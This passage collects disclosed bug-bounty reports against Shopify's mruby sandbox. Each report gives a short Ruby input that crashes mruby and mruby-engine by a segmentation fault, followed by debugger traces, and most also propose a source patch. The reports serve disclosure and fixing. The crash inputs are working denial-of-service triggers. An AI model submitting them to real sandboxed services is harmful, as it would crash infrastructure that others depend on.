-- Machine register context ------------------------------------------------
 rax: 0x0000000000000001 rbx: 0x00000001016665a8 rcx: 0x0000000101678a60
 rdx: 0x0000000000000000 rdi: 0x0000000101666440 rsi: 0x0000000000000000
 rbp: 0x00007fff5efe5f10 rsp: 0x00007fff5efe5ef0  r8: 0x0000000000000001
  r9: 0x0000000000000000 r10: 0x0000000000000001 r11: 0x00000001016665a8
 r12: 0x0000000000000000 r13: 0x0000000101666440 r14: 0x0000000101666440
 r15: 0x0000000000000000 rip: 0x00000001015440f1 rfl: 0x0000000000010202

-- C level backtrace information -------------------------------------------
0   ruby                                0x0000000100db65d4 rb_vm_bugreport + 388
1   ruby                                0x0000000100c58023 rb_bug_context + 483
2   ruby                                0x0000000100d2b653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x00000001015440f1 ary_modify + 17
5   ???                                 0x00000001016665a8 0x0 + 4318455208

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Abort trap: 6

```

After applying that patch to `ext/mruby_engine/mruby` and recompiling, that crash no longer happens.

Just to clarify, I'm not to sure how one would achieve `$10,000 for denial of service against Shopify’s infrastructure caused by a bug in mruby or mruby_engine (for example, a crash in the native library).` as your rules clearly state to not test against your infrastructure. Is that something your end tests after submission of the bug?

Also, should I approach mruby directly to get the patch resolved?

Cheers,

Hugh

---

### [Null pointer derefence due to bug in codegen with negation without using value](https://hackerone.com/reports/187536)

- **Report ID:** `187536`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @haquaman
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-17T20:08:23.151Z
- **CVE(s):** -

**Vulnerability Information:**

Crash file is:

```
p *case
  when nil
    -0
    nil
end
```

```
$ ./dev/bin/mruby crash.rb
crash.rb:1:3: '*' interpreted as argument prefix
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 5638 launched: './dev/bin/mruby' (x86_64)
crash.rb:1:3: '*' interpreted as argument prefix
Process 5638 stopped
* thread #1: tid = 0x85b9d00, 0x000000010000278b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)
    frame #0: 0x000000010000278b mruby`ary_concat + 27
mruby`ary_concat:
->  0x10000278b <+27>: movl   0x18(%rdx), %ecx
    0x10000278e <+30>: addl   -0x1c(%rbp), %ecx
    0x100002791 <+33>: movl   %ecx, -0x20(%rbp)
    0x100002794 <+36>: movq   -0x8(%rbp), %rdi
(lldb) bt
* thread #1: tid = 0x85b9d00, 0x000000010000278b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)
  * frame #0: 0x000000010000278b mruby`ary_concat + 27
    frame #1: 0x0000000100002766 mruby`mrb_ary_concat + 70
    frame #2: 0x000000010004451f mruby`mrb_vm_exec + 25439
    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135
    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100
    frame #5: 0x0000000100071adf mruby`load_exec + 1183
    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67
    frame #7: 0x00000001000017d8 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x000000010100f030
       rbx = 0x0000000000000000
       rcx = 0x0000000000000000
       rdx = 0x0000000000000000
       rdi = 0x0000000100300390
       rsi = 0x0000000000000000
       rbp = 0x00007fff5fbfca00
       rsp = 0x00007fff5fbfc9e0
        r8 = 0x0000000000000000
        r9 = 0x000000000000010e
       r10 = 0x0000000000000002
       r11 = 0x0000000000f83160
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x000000010000278b  mruby`ary_concat + 27
    rflags = 0x0000000000010202
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

```
$ ./bin/sandbox crash.rb
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000018
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval
c:0002 p:0214 s:0006 E:001c70 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001b60 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x0000000104c7c120 rbx: 0x0000000104cd3c28 rcx: 0x0000000000000003
 rdx: 0x0000000104c7c120 rdi: 0x0000000104c74440 rsi: 0x0000000000000000
 rbp: 0x00007fff5b9daf50 rsp: 0x00007fff5b9daf20  r8: 0x0000000000000000
  r9: 0x0000000104c75d60 r10: 0x0000000104c86a88 r11: 0x0000000000000020
 r12: 0x0000000104c74460 r13: 0x0000000000000000 r14: 0x0000000000000000
 r15: 0x0000000000000000 rip: 0x0000000104b4e97d rfl: 0x0000000000010206

-- C level backtrace information -------------------------------------------
0   ruby                                0x00000001043c15d4 rb_vm_bugreport + 388
1   ruby                                0x0000000104263023 rb_bug_context + 483
2   ruby                                0x0000000104336653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x0000000104b4e97d mrb_ary_concat + 29
5   ???                                 0x0000000104c74440 0x0 + 4375135296

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Abort trap: 6

```

Patch to fix is:

```
diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c
index 553baa1..5ddf988 100644
--- a/mrbgems/mruby-compiler/core/codegen.c
+++ b/mrbgems/mruby-compiler/core/codegen.c
@@ -2256,7 +2256,7 @@ codegen(codegen_scope *s, node *tree, int val)
             }
             genop(s, co);
           }
-          push();
+          if (val) push();
         }
         break;
 
```

Hope that helps!

Cheers,

Hugh

---

### [Segmentation fault due to bad memory access in kh_get_mt](https://hackerone.com/reports/188313)

- **Report ID:** `188313`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @haquaman
- **Bounty:** 8000 usd
- **Disclosed:** 2016-12-17T20:07:37.420Z
- **CVE(s):** -

**Vulnerability Information:**

Crash file is:

```
values=[0,0,0,0]
unused_but_needed=[]
Hash=[]
values.each do
  values.each do
    values & values.each do
      values.each do
        %  [0]=nil
      end
    end
  end
end
```

```
 $ ./dev/bin/mruby crash.rb
Segmentation fault: 11

```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 27834 launched: './dev/bin/mruby' (x86_64)
Process 27834 stopped
* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)
    frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38
mruby`kh_get_mt:
->  0x100006cb6 <+38>: movl   (%rsi), %eax
    0x100006cb8 <+40>: subl   $0x1, %eax
    0x100006cbb <+43>: andl   %eax, %edx
    0x100006cbd <+45>: movl   %edx, -0x20(%rbp)
(lldb) bt
* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)
  * frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38
    frame #1: 0x000000010000ba80 mruby`mrb_method_search_vm + 80
    frame #2: 0x000000010003f8b9 mruby`mrb_vm_exec + 5881
    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135
    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100
    frame #5: 0x0000000100071adf mruby`load_exec + 1183
    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67
    frame #7: 0x00000001000017d8 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000000000000025
       rbx = 0x0000000000000000
       rcx = 0x00000001002028a0
       rdx = 0x00000000000002eb
       rdi = 0x00000001002029f0
       rsi = 0x0000000000000080
       rbp = 0x00007fff5fbfc9f0
       rsp = 0x00007fff5fbfc9f0
        r8 = 0x00000001002029ff
        r9 = 0x00007fff5fbfc9b0
       r10 = 0xf100d311ef8d6921
       r11 = 0x0000000000000001
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100006cb6  mruby`kh_get_mt + 38
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

Another lldb run with symbols to see what class is in the `mrb_method_search_vm`

```
$ lldb ./mruby/bin/mruby crash.rb
(lldb) target create "./mruby/bin/mruby"
Current executable set to './mruby/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 95246 launched: './mruby/bin/mruby' (x86_64)
nt = 3
nt = 17
nt = 24
nt = 35
nt = 51
nt = 51
nt = 51
nt = 51
nt = 24
nt = 35
nt = 24
nt = 35
nt = 29
nt = 40
nt = 4
nt = 17
nt = 29
nt = 40
nt = 4
nt = 17
nt = 29
nt = 40
nt = 29
nt = 40
nt = 4
nt = 17
nt = 29
nt = 40
nt = 4
nt = 17
nt = 24
nt = 87
nt = 56
nt = 51
in gen_send
in gen_send
in gen_send
in gen_send
in gen_send
in gen_send
Process 95246 stopped
* thread #1: tid = 0x87adab7, 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)
    frame #0: 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19
   16   #include <mruby/data.h>
   17   #include <mruby/istruct.h>
   18
-> 19   KHASH_DEFINE(mt, mrb_sym, struct RProc*, TRUE, kh_int_hash_func, kh_int_hash_equal)
   20
   21   void
   22   mrb_gc_mark_mt(mrb_state *mrb, struct RClass *c)
(lldb) up
frame #1: 0x000000010000b200 mruby`mrb_method_search_vm(mrb=0x0000000100202c80, cp=0x00007fff5fbfd478, mid=150) + 80 at class.c:1225
   1222     khash_t(mt) *h = c->mt;
   1223
   1224     if (h) {
-> 1225       k = kh_get(mt, mrb, h, mid);
   1226       if (k != kh_end(h)) {
   1227         m = kh_value(h, k);
   1228         if (!m) break;
(lldb) up
frame #2: 0x000000010003f039 mruby`mrb_vm_exec(mrb=0x0000000100202c80, proc=0x0000000100805810, pc=0x0000000100091124) + 5881 at vm.c:1116
   1113         }
   1114       }
   1115       c = mrb_class(mrb, recv);
-> 1116       m = mrb_method_search_vm(mrb, &c, mid);
   1117       if (!m) {
   1118         mrb_value sym = mrb_symbol_value(mid);
   1119         mrb_sym missing = mrb_intern_lit(mrb, "method_missing");
(lldb) p *c
(RClass) $0 = {
  tt = MRB_TT_STRING
  color = 2
  flags = 0
  c = 0x000000010080ccb0
  gcnext = 0x0000000000000000
  iv = 0x0000000000000000
  mt = 0x0000000000000080
  super = 0x0000000100700470
}
(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

Also affects `mruby-engine`.

```
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000080
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval
c:0002 p:0214 s:0006 E:0001f0 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:000570 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x00000000000002eb rbx: 0x0000000107c48af8 rcx: 0x0000000000000000
 rdx: 0x0000000000000096 rdi: 0x0000000107c36440 rsi: 0x00007fff58a19190
 rbp: 0x00007fff58a18f50 rsp: 0x00007fff58a18f28  r8: 0x0000000000000001
  r9: 0x0000000107bb9104 r10: 0x0000000107bb9100 r11: 0x0000000107c48b00
 r12: 0x0000000000000096 r13: 0x0000000000000096 r14: 0x0000000000000080
 r15: 0x0000000107c3fc20 rip: 0x0000000107b198e9 rfl: 0x0000000000010202

-- C level backtrace information -------------------------------------------
0   ruby                                0x00000001073835d4 rb_vm_bugreport + 388
1   ruby                                0x0000000107225023 rb_bug_context + 483
2   ruby                                0x00000001072f8653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x0000000107b198e9 mrb_method_search_vm + 89
5   ???                                 0x0000000107c48af8 0x0 + 4425288440

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

I haven't worked out the ideal place for a patch yet.

Cheers,

Hugh

---

### [Denial of service due to invalid memory access in mrb_ary_concat](https://hackerone.com/reports/184712)

- **Report ID:** `184712`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @haquaman
- **Bounty:** 8000 usd
- **Disclosed:** 2016-12-17T20:07:10.168Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

The following file causes a segmentation fault in mruby, which also causes a segmentation fault in mruby-engine. I've minimized this file down to the bare bones what crashes it, then renamed variables and tidied so you can see what is needed and what isn't.

```
case ""
  when 0
end
x *case
  when true
    * = 0
end
```

Also this file causes the same issue:

```
case ""
  when 0
end
x = *case
  when 0
    * = 0
end
```

Difference between the two is one is a method call, and one is assignment.

```
$ ./dev/bin/mruby --version
mruby 1.2.0 (2015-11-17)
```

```
$ ./dev/bin/mruby crash-1.rb
crash-1.rb:4:3: '*' interpreted as argument prefix
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash-1.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash-1.rb"
(lldb) r
Process 54552 launched: './dev/bin/mruby' (x86_64)
crash-1.rb:4:3: '*' interpreted as argument prefix
Process 54552 stopped
* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
    frame #0: 0x0000000100001837 mruby`ary_modify + 55
mruby`ary_modify:
->  0x100001837 <+55>: cmpl   $0x1, (%rax)
    0x10000183a <+58>: jne    0x100001889               ; <+137>
    0x100001840 <+64>: movq   -0x10(%rbp), %rax
    0x100001844 <+68>: movq   0x28(%rax), %rax
(lldb) bt
* thread #1: tid = 0x652cabc, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
  * frame #0: 0x0000000100001837 mruby`ary_modify + 55
    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49
    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70
    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439
    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #6: 0x000000010006f19f mruby`load_exec + 1183
    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #8: 0x0000000100000d78 mruby`main + 904
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000004800000019
       rbx = 0x0000000000000000
       rcx = 0x0000000000200086
       rdx = 0x0000000100000000  mruby`_mh_execute_header
       rdi = 0x00000001002029f0
       rsi = 0x0000000100000000  mruby`_mh_execute_header
       rbp = 0x00007fff5fbfc9d0
       rsp = 0x00007fff5fbfc9a0
        r8 = 0x0000000000000001
        r9 = 0x0000000000000000
       r10 = 0x0000000000000001
       r11 = 0x0000000100200000
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001837  mruby`ary_modify + 55
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

and the second file:

```
$ ./dev/bin/mruby crash-2.rb
Segmentation fault: 11
```

```
$ lldb ./dev/bin/mruby crash-2.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash-2.rb"
(lldb) r
Process 66755 launched: './dev/bin/mruby' (x86_64)
Process 66755 stopped
* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
    frame #0: 0x0000000100001837 mruby`ary_modify + 55
mruby`ary_modify:
->  0x100001837 <+55>: cmpl   $0x1, (%rax)
    0x10000183a <+58>: jne    0x100001889               ; <+137>
    0x100001840 <+64>: movq   -0x10(%rbp), %rax
    0x100001844 <+68>: movq   0x28(%rax), %rax
(lldb) bt
* thread #1: tid = 0x652fc10, 0x0000000100001837 mruby`ary_modify + 55, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x4800000019)
  * frame #0: 0x0000000100001837 mruby`ary_modify + 55
    frame #1: 0x0000000100001ca1 mruby`ary_concat + 49
    frame #2: 0x0000000100001c66 mruby`mrb_ary_concat + 70
    frame #3: 0x000000010004263f mruby`mrb_vm_exec + 25439
    frame #4: 0x000000010003c2c7 mruby`mrb_vm_run + 135
    frame #5: 0x00000001000446b4 mruby`mrb_top_run + 100
    frame #6: 0x000000010006f19f mruby`load_exec + 1183
    frame #7: 0x000000010006ece3 mruby`mrb_load_file_cxt + 67
    frame #8: 0x0000000100000d78 mruby`main + 904
    frame #9: 0x00007fff8a9db5ad libdyld.dylib`start + 1
    frame #10: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000004800000019
       rbx = 0x0000000000000000
       rcx = 0x0000000000200086
       rdx = 0x0000000100000000  mruby`_mh_execute_header
       rdi = 0x00000001002029f0
       rsi = 0x0000000100000000  mruby`_mh_execute_header
       rbp = 0x00007fff5fbfc9d0
       rsp = 0x00007fff5fbfc9a0
        r8 = 0x0000000000000001
        r9 = 0x0000000000000000
       r10 = 0x0000000000000001
       r11 = 0x0000000100700000
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100001837  mruby`ary_modify + 55
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

I took a look at the cause in the codegeneration, ... and gave up. But in the `src/array.c` I could fix these two issues with one patch, as follows:

```
diff --git a/src/array.c b/src/array.c
index 5a319d8..4814968 100644
--- a/src/array.c
+++ b/src/array.c
@@ -259,6 +259,15 @@ ary_concat(mrb_state *mrb, struct RArray *a, mrb_value *ptr, mrb_int blen)
 MRB_API void
 mrb_ary_concat(mrb_state *mrb, mrb_value self, mrb_value other)
 {
+  if (!mrb_array_p(self)) {
+    mrb_raisef(mrb, E_TYPE_ERROR, "expecting Array, got %S", mrb_obj_value(mrb_obj_class(mrb, self)));
+    return;
+  }
+  if (!mrb_array_p(other)) {
+    mrb_raisef(mrb, E_TYPE_ERROR, "expecting Array, got %S", mrb_obj_value(mrb_obj_class(mrb, other)));
+    return;
+  }
+
   struct RArray *a2 = mrb_ary_ptr(other);
 
   ary_concat(mrb, mrb_ary_ptr(self), a2->ptr, a2->len);
```

As mentioned above, both these files affect mruby-engine as well:

```
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000019
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:0006b8 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:002310 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x000000011061c3f0 rbx: 0x0000000110674668 rcx: 0x0000000000000004
 rdx: 0x000000011061c3f0 rdi: 0x0000000110614440 rsi: 0x0000000000000001
 rbp: 0x00007fff50037f40 rsp: 0x00007fff50037f10  r8: 0x0000000000000003
  r9: 0x0000000000000000 r10: 0x0000000000000000 r11: 0x00000001106145a8
 r12: 0x00000001106145a8 r13: 0x000000011063b2f0 r14: 0x0000000000000001
 r15: 0x0000000000000001 rip: 0x00000001104f233d rfl: 0x0000000000010246

-- C level backtrace information -------------------------------------------
0   ruby                                0x000000010fd645d4 rb_vm_bugreport + 388
1   ruby                                0x000000010fc06023 rb_bug_context + 483
2   ruby                                0x000000010fcd9653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x00000001104f233d mrb_ary_concat + 29
5   ???                                 0x0000000110614440 0x0 + 4569777216

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

The second file produced same backtrace, but different register values.

After applying that patch to `ext/mruby_engine/mruby` and recompiling, these two files no longer crash.

If you end up finding a better patch elsewhere for the root cause, can you let me know what you end up applying so I can change what I fuzz against?

Cheers,

Hugh

---

### [NULL pointer dereference when parsing ternary operators](https://hackerone.com/reports/181677)

- **Report ID:** `181677`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @jpenalbae
- **Bounty:** - usd
- **Disclosed:** 2016-12-17T02:31:04.612Z
- **CVE(s):** -

**Vulnerability Information:**

There is a NULL pointer dereference when parsing ternary operators which will cause a crash. This could be used to cause a DoS.

Sample code causing the crash (file sample.rb is also attached):
```ruby
b = a () ? 1 : 0
```

Note that `a ()` should be treated as a method call which in this case is also undefined, but when adding a blank in between the `a` and `()` it causes a crash (Find full crash attached as crash.log):
```
$ bin/sandbox /tmp/sample.rb
bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000000
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:000a48 EVAL   bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:000380 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:20:in `<main>'
bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f5de668c3df RBP: 0x00007f5de5237ef4 RSP: 0x00007ffdcbdda5e0
 RAX: 0x00007f5de5237e2c RBX: 0x00007f5de523f830 RCX: 0x0000000000000000
 RDX: 0x00007f5de66e710c RDI: 0x00007f5de5237f0c RSI: 0x0000000000000000
  R8: 0x0000000000000000  R9: 0x00007f5de52055d0 R10: 0x0000000000000001
 R11: 0x0000000000000001 R12: 0x00007f5de52055d0 R13: 0x0000000000000005
 R14: 0x0000000000000001 R15: 0x00007f5de5237f24 EFL: 0x0000000000010217

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea978ea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9790dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea853364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea904dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f5dea5d7ed0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x37f) [0x7f5de668c3df] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(gen_values+0x52) [0x7f5de6692eb2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:825
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(gen_call.isra.12+0x101) [0x7f5de66934c1] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:855
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x3722) [0x7f5de668f782] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1533
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x30d8) [0x7f5de668f138] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1637
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x2e9e) [0x7f5de668eefe] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1233
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(scope_body.isra.17+0x3e) [0x7f5de6694b2e] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:718
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(codegen+0x2187) [0x7f5de668e1e7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1528
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_generate_code+0xda) [0x7f5de669663a] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:2890
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(me_mruby_engine_generate_code+0x7a) [0x7f5de665800a] ../../../../ext/mruby_engine/mruby_engine.c:226
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(ext_mruby_engine_eval+0x89) [0x7f5de665a619] ../../../../ext/mruby_engine/ext.c:193
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9667bb]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9746a3]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea9756d3]
